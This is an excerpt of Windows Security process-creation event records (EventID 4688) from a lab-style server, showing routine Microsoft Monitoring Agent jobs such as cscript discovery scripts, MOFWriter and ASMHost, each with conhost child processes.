      <Execution ProcessID="4" ThreadID="2424" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x1588</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x13b8</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:57:03.015963100Z" />
      <EventRecordID>354617</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5328" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x112c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1638</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cscript.exe" /nologo "MonitorKnowledgeDiscovery.vbs"</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:57:03.030233600Z" />
      <EventRecordID>354618</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5328" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x764</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x112c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:58:03.005514000Z" />
      <EventRecordID>354631</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5716" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x11e4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1638</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cscript.exe" /nologo "MonitorKnowledgeDiscovery.vbs"</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:58:03.023771700Z" />
      <EventRecordID>354632</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5716" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0xabc</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x11e4</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:59:03.014392600Z" />
      <EventRecordID>354645</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5544" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x158c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1638</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cscript.exe" /nologo "MonitorKnowledgeDiscovery.vbs"</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T14:59:03.029126800Z" />
      <EventRecordID>354646</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="5544" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x13b4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x158c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T15:00:03.014165700Z" />
      <EventRecordID>354659</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2852" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x13c4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1638</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cscript.exe" /nologo "MonitorKnowledgeDiscovery.vbs"</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T15:00:03.031452200Z" />
      <EventRecordID>354660</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2852" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0xde4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x13c4</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T15:00:03.204405800Z" />
      <EventRecordID>354673</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2852" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x1388</Data>
      <Data Name="NewProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\MOF\MOFWriter.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1638</Data>
      <Data Name="CommandLine">"C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\MOF\MOFWriter.exe"  -baseline "C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Resources\113\BaselineWindowsServer2016.xml" -out "C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447\BaselineRulesetAll.mof" -err "C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447\xmlToMoferrors.txt" </Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T15:00:03.228069300Z" />
      <EventRecordID>354674</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2852" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x16e0</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1388</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\MOF\MOFWriter.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T15:00:03.421565700Z" />
      <EventRecordID>354675</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2852" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x774</Data>
      <Data Name="NewProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\DSC\ASMHost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1638</Data>
      <Data Name="CommandLine">"C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\DSC\ASMHost.exe" Get "C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447\BaselineRulesetAll.mof" "C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\1101447"</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T15:00:03.482787100Z" />
      <EventRecordID>354676</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="2852" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x10a4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x774</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\DSC\ASMHost.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T15:01:03.003294900Z" />
      <EventRecordID>354677</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="4152" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0x123c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1638</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cscript.exe" /nologo "MonitorKnowledgeDiscovery.vbs"</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2021-04-21T15:01:03.018624800Z" />
      <EventRecordID>354678</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="4152" />
      <Channel>Security</Channel>
      <Computer>srvdefender01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">SRVDEFENDER01$</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="NewProcessId">0xabc</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x123c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cscript.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-16384</Data>
    </EventData>
  </Event>
  